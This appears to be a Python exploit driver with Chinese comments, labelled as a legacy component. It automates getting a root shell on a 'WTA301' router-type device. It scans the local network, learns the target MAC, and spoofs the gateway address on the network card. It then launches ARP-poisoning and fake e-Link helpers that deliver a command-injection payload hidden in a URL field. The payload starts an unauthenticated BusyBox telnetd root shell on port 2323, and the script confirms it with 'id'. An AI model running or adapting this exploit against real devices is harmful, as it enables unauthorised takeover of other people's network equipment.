# ============================================================================
# 旧版组件 —— 已被 ../../rawtcp_gw.py 取代，保留只为对上既有文档的引用。
# 注意：getroot.py 走「给本机加 <网关IP>/32 别名」的老路，单网卡拓扑下会断网。
# ============================================================================

#!/usr/bin/env python3
"""getroot.py - WTA301 一键拿 root shell（自动识别 IP / MAC / 网卡）

做四件事，全自动：
  1) 扫描局域网找 WTA301（HTTP 标题 / 23 端口 / 已知 IP 探测）
  2) 读目标真实 MAC（ARP 表 → 嗅探兜底）
  3) 给无线网卡加 <网关IP>/32 伪装地址（skipassource，Windows 强主机模型必须）
  4) 起 srv.py + elink_gw4.py + poison.py 三件套，等到 2323 出现并验证 uid=0

用法:
    python getroot.py                # 全自动
    python getroot.py --ip 192.168.0.152
    python getroot.py --no-alias     # 不动网卡地址（已手工配好时）
    python getroot.py --wait 1800    # 等待秒数（默认 1500）

成功后：telnet <IP> 2323 直接是 root（无用户名密码）。
"""
import argparse, json, os, re, socket, subprocess, sys, threading, time, urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
os.chdir(HERE)
PY = sys.executable

DEFAULT_IP = os.environ.get('WTA_HOST', '192.168.0.152')
SRV_PORT = int(os.environ.get('SRV_PORT', '8099'))
SHELL_PORT = int(os.environ.get('SHELL_PORT', '2323'))
ALIAS_IP = os.environ.get('ALIAS_IP', '192.168.0.1')   # 设备回连的“网关”地址
IFACE = os.environ.get('IFACE', 'WLAN')

LOG = os.path.join(HERE, 'getroot.log')


def log(*a):
    s = ' '.join(str(x) for x in a)
    line = time.strftime('[%H:%M:%S] ') + s
    print(line, flush=True)
    with open(LOG, 'a', encoding='utf-8') as f:
        f.write(line + '\n')


def sh(*a):
    try:
        return subprocess.run(a, capture_output=True, timeout=25).stdout.decode('gbk', 'replace')
    except Exception:
        return ''


# ---------------------------------------------------------------- 1. 找设备
def local_ips():
    """本机所有 IPv4 地址 + 前缀，用于推导扫描网段。"""
    out = sh('netsh', 'interface', 'ipv4', 'show', 'addresses')
    ips = []
    for l in out.splitlines():
        m = re.search(r'IP \S+:?\s+(192\.168\.\d+\.\d+|10\.\d+\.\d+\.\d+|172\.(?:1[6-9]|2\d|3[01])\.\d+\.\d+)', l)
        if m:
            ips.append(m.group(1))
    return ips


def is_wta(ip, timeout=1.2):
    """HTTP 标题含 WTA301 / TP-Link 或 23 端口有 psh 提示 => 认为命中。"""
    try:
        r = urllib.request.urlopen('http://%s/' % ip, timeout=timeout)
        head = r.read(400).decode('utf-8', 'replace')
        return 'WTA301' in head or 'TP-LINK' in head.upper()
    except Exception:
        pass
    try:
        s = socket.create_connection((ip, 23), timeout)
        s.settimeout(timeout)
        banner = b''
        try:
            banner = s.recv(200)
        except Exception:
            pass
        s.close()
        return b'login' in banner or b'BusyBox' in banner
    except Exception:
        return False


def find_device(hint):
    if hint:
        log('指定 IP:', hint)
        return hint
    if os.path.exists('.wta_host'):
        ip = open('.wta_host').read().strip()
        if ip and is_wta(ip):
            log('沿用上次 IP:', ip)
            return ip
    if is_wta(DEFAULT_IP):
        log('默认 IP 命中:', DEFAULT_IP)
        return DEFAULT_IP
    cands = []
    for lip in local_ips():
        pref = lip.rsplit('.', 1)[0]
        cands += ['%s.%d' % (pref, i) for i in range(2, 255)]
    log('扫描 %d 个地址…' % len(cands))
    hit = []
    lock = threading.Lock()

    def probe(ip):
        if is_wta(ip):
            with lock:
                hit.append(ip)
    ths = [threading.Thread(target=probe, args=(ip,), daemon=True) for ip in cands]
    for t in ths:
        t.start()
    for t in ths:
        t.join(timeout=1.5)
    if not hit:
        return None
    # 优先 192.168.0.x
    hit.sort(key=lambda x: (not x.startswith('192.168.0.'), x))
    log('扫描命中:', ', '.join(hit))
    return hit[0]


# ---------------------------------------------------------------- 2. 找 MAC
def arp_mac(ip):
    a = sh('arp', '-a')
    for l in a.splitlines():
        if ip in l:
            m = re.search(r'([0-9a-f]{2}(?:-[0-9a-f]{2}){5})', l, re.I)
            if m:
                return m.group(1).replace('-', ':').upper()
    return None


def sniff_mac(ip, timeout=15):
    try:
        from scapy.all import conf, Ether, IP, ARP, sniff
        conf.use_pcap = True
        got = []

        def h(p):
            if Ether in p and ((IP in p and p[IP].src == ip) or (ARP in p and p[ARP].psrc == ip)):
                got.append(p[Ether].src)
        sh('ping', '-n', '3', ip)
        sniff(iface=IFACE, timeout=timeout, prn=h, store=False,
              filter='arp or (ip and host %s)' % ip,
              stop_filter=lambda p: bool(got))
        return got[0].upper() if got else None
    except Exception as e:
        log('嗅探 MAC 失败:', repr(e))
        return None


# ---------------------------------------------------------------- 3. 网卡别名
def ensure_alias():
    out = sh('netsh', 'interface', 'ipv4', 'show', 'addresses', 'name=' + IFACE)
    if re.search(re.escape(ALIAS_IP) + r'\b', out):
        log('网卡已有 %s，跳过' % ALIAS_IP)
        return True
    log('添加伪装地址 %s/32 到 %s (skipassource)' % (ALIAS_IP, IFACE))
    r = subprocess.run(['netsh', 'interface', 'ipv4', 'add', 'address', 'name=' + IFACE,
                        'address=' + ALIAS_IP, 'mask=255.255.255.255', 'skipassource=true'],
                       capture_output=True).stdout.decode('gbk', 'replace')
    time.sleep(1)
    ok = re.search(re.escape(ALIAS_IP) + r'\b', sh('netsh', 'interface', 'ipv4', 'show', 'addresses', 'name=' + IFACE))
    log('别名结果:', 'OK' if ok else r.strip())
    # 复测上网
    if 'TTL=' not in sh('ping', '-n', '1', '223.5.5.5'):
        log('!! 警告：加别名后互联网不通，请手动检查默认路由（USB RNDIS 应仍在）')
    return bool(ok)


# ---------------------------------------------------------------- 4. 三件套
def kill_listener(port):
    """同一端口上残留的旧 srv.py 会抢走请求（Windows 允许多个 SO_REUSEADDR 绑定），先清干净。"""
    out = sh('netstat', '-ano')
    pids = set()
    for l in out.splitlines():
        if (':%d ' % port) in l and 'LISTENING' in l.upper():
            pids.add(l.split()[-1])
    for pid in pids:
        if pid.isdigit() and int(pid) != os.getpid():
            subprocess.run(['taskkill', '/F', '/PID', pid], capture_output=True)
            log('清理端口 %d 的旧进程 pid=%s' % (port, pid))


def port_open(ip, port, t=1.0):
    s = socket.socket(); s.settimeout(t)
    try:
        return s.connect_ex((ip, port)) == 0
    finally:
        s.close()


def spawn(args, name):
    logf = open(os.path.join(HERE, name + '.log'), 'a', encoding='utf-8', errors='replace')
    env = dict(os.environ, PYTHONUNBUFFERED='1')   # 不然日志全被缓冲、看不到进度
    p = subprocess.Popen([PY, '-u'] + args, cwd=HERE, stdout=logf, stderr=subprocess.STDOUT, env=env,
                         creationflags=getattr(subprocess, 'CREATE_NEW_PROCESS_GROUP', 0))
    log('启动 %s pid=%d' % (name, p.pid))
    return p


def payload(pc_ip):
    """注意：URL 里的主机必须是【本机】IP，不是设备 IP。"""
    return 'http://%s:%d/x;(/bin/busybox telnetd -l /bin/sh -p %d >/dev/null 2>&1 &);' % (pc_ip, SRV_PORT, SHELL_PORT)


def verify_root(ip):
    s = socket.create_connection((ip, SHELL_PORT), 8)
    s.settimeout(6)
    time.sleep(1.5)
    try:
        s.recv(65535)
    except Exception:
        pass
    s.sendall(b'id\n')
    time.sleep(1.5)
    out = b''
    try:
        out = s.recv(65535)
    except Exception:
        pass
    s.close()
    txt = out.decode('utf-8', 'replace')
    return 'uid=0' in txt, txt.strip()[-200:]


def main():
    ap = argparse.ArgumentParser()
    ap.add_argument('--ip', default=None, help='设备 IP（默认自动找）')
    ap.add_argument('--wait', type=int, default=1500, help='等待 root 出现的最长秒数')
    ap.add_argument('--no-alias', action='store_true')
    ap.add_argument('--keep', action='store_true', help='成功后保留三件套（默认清理）')
    a = ap.parse_args()
    open(LOG, 'a', encoding='utf-8').write('\n==== %s getroot start ====\n' % time.strftime('%Y-%m-%d %H:%M:%S'))

    ip = find_device(a.ip)
    if not ip:
        log('!! 没找到 WTA301。检查：电脑是否连着它的 WiFi（SSID 卡皮巴拉）、设备是否在线。')
        return 2
    open('.wta_host', 'w', encoding='utf-8').write(ip)
    log('目标设备:', ip)

    sh('ping', '-n', '3', ip)
    # ★ARP 缓存会过期/错乱（实测 arp -a 给出的 MAC 与实际在线的不同），
    #   所以以“线上嗅到的源 MAC”为准，arp 表只作兜底。
    arp_del = sh('arp', '-d', ip)
    sh('ping', '-n', '2', ip)
    mac = sniff_mac(ip, timeout=10) or arp_mac(ip)
    if not mac:
        log('!! 读不到 MAC（arp 无记录且嗅探失败）。先 ping 通再试。')
        return 2
    cached = arp_mac(ip)
    log('目标 MAC:', mac, '(每次重启都会变，本次现学)')
    if cached and cached.upper() != mac.upper():
        log('   注意：arp 表里是 %s，与实际不符（缓存过期），已按实测值走' % cached)

    if not a.no_alias and not ensure_alias():
        log('!! 伪装地址未生效，e-Link 包会到不了本地 socket（见复现手册 §2.2）')

    if port_open(ip, SHELL_PORT):
        ok, tail = verify_root(ip)
        log('2323 已开，直接验证 root:', 'YES' if ok else 'NO', '|', tail)
        if ok:
            log('=== 完成：telnet %s %d 即 root shell ===' % (ip, SHELL_PORT))
            return 0

    pc_ip = os.environ.get('PC_IP') or find_pc_ip(ip)
    pl = payload(pc_ip)
    # ★MYMAC 绝不能设成目标 MAC！poison.py 自己从 netsh 探测本机网卡 MAC。
    env = dict(os.environ, WTA_HOST=ip, IFACE=IFACE, SPOOF=ALIAS_IP,
               SRV_PORT=str(SRV_PORT), ELINK_PORT=os.environ.get('ELINK_PORT', '32768'),
               PC_IP=pc_ip)
    env.pop('MYMAC', None)
    os.environ.update(env)
    log('本机 IP:', pc_ip, '| payload:', pl)

    kill_listener(SRV_PORT)
    kill_listener(int(os.environ.get('ELINK_PORT', '32768')))
    srv = spawn(['srv.py'], 'srv')
    time.sleep(1)
    try:
        urllib.request.urlopen('http://%s:%d/getroot.py' % (pc_ip, SRV_PORT), timeout=3)
        log('HTTP 服务 OK http://%s:%d' % (env['PC_IP'], SRV_PORT))
    except Exception as e:
        log('!! HTTP 服务异常:', repr(e))

    gw = spawn(['elink_gw4.py', str(a.wait), 'ctcapd.appd', 'install', json.dumps({'url': pl})], 'elink')
    time.sleep(1)
    ps = spawn(['poison.py', str(a.wait)], 'poison')
    time.sleep(3)
    try:
        plog = open(os.path.join(HERE, 'poison.log'), encoding='utf-8', errors='replace').read()
        m = re.findall(r'target .* mac (\S+)', plog)
        if m:
            log('poison 使用 MAC:', m[-1], '(与预探测一致)' if m[-1].upper() == mac.upper()
                else '(arp 学到的，通常也对：设备有多网卡，两种都通)')
    except Exception:
        pass

    log('等待 elinkclt 回连（约 4 分钟一轮，最长 %ds）…' % a.wait)
    t0 = time.time()
    while time.time() - t0 < a.wait:
        if port_open(ip, SHELL_PORT):
            time.sleep(2)
            ok, tail = verify_root(ip)
            if ok:
                log('=== 成功！root shell: telnet %s %d ===' % (ip, SHELL_PORT))
                if not a.keep:
                    for p_, n_ in ((ps, 'poison'), (gw, 'elink'), (srv, 'srv')):
                        try:
                            p_.terminate()
                            log('已停止', n_)
                        except Exception:
                            pass
                return 0
            log('2323 开了但验证异常:', tail)
        time.sleep(5)
    log('!! 超时未拿到 root。排查：')
    log('   1) tail elink_gw4.log —— 只有 listen 说明包没到（别名/毒化/WiFi）')
    log('   2) tail poison.log —— 是否 no target mac')
    log('   3) 设备可能进入退避：重启路由器后立即重跑本脚本')
    return 1


def find_pc_ip(dev_ip):
    """本机在设备同网段的地址。"""
    pref = dev_ip.rsplit('.', 1)[0] + '.'
    for ip in local_ips():
        if ip.startswith(pref):
            return ip
    return '192.168.0.121'


if __name__ == '__main__':
    sys.exit(main())

